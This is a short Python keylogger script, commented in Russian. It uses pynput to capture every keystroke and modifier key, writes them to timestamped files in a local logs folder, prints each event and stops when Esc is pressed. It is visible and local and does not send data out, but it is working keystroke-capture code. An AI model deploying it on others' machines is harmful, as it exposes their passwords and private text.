from pynput import keyboard
import logging
from datetime import datetime
import os
import re

# если папки logs нет — создаем
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

def get_next_log_filename():
    files = os.listdir(log_dir)
    pattern = re.compile(r"(\d+)keylogger_\d{4}-\d{2}-\d{2}_\d{2}-\d{2}-\d{2}\.txt")
    numbers = []

    for f in files:
        match = pattern.match(f)
        if match:
            numbers.append(int(match.group(1)))

    next_num = max(numbers) + 1 if numbers else 1
    now_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{next_num}keylogger_{now_str}.txt"
    return os.path.join(log_dir, filename)

# имя лог-файла
log_file = get_next_log_filename()

# настраиваем логирование
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
    datefmt="%d.%m/%H:%M:%S",
    encoding='utf-8'
)

modifiers = set()  # сюда попадают shift, ctrl 
pressed_chars = set()  # чтоб не спамить повторами нажатий

def modifiers_to_str():
    if not modifiers:
        return ""
    return "+".join(sorted(modifiers))

def log_key_event(event_type, key):
    try:
        mods = modifiers_to_str()
        mods_str = f" modifiers={mods}" if mods else ""

        if hasattr(key, 'char') and key.char is not None:
            char_repr = repr(key.char)

            if event_type == "Pressed":
                if key.char in pressed_chars:
                    return
                pressed_chars.add(key.char)

            elif event_type == "Released":
                if key.char in pressed_chars:
                    pressed_chars.remove(key.char)

            if event_type == "Pressed":
                msg = f"{event_type}: char={char_repr}{mods_str}"
            else:
                return

        else:
            msg = f"{event_type}: special key={key}{mods_str}"

            if event_type == "Pressed":
                if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                    modifiers.add("Shift")
                elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
                    modifiers.add("Ctrl")
                elif key in (keyboard.Key.alt, keyboard.Key.alt_r):
                    modifiers.add("Alt")

            elif event_type == "Released":
                if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                    modifiers.discard("Shift")
                elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
                    modifiers.discard("Ctrl")
                elif key in (keyboard.Key.alt, keyboard.Key.alt_r):
                    modifiers.discard("Alt")

        logging.info(msg)
        print(msg)

    except Exception as e:
        logging.error(f"Logging error: {e}")

def on_press(key):
    log_key_event("Pressed", key)

    # вырубает прогу если нажать Esc
    if key == keyboard.Key.esc:
        return False

def on_release(key):
    log_key_event("Released", key)

# запуск
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
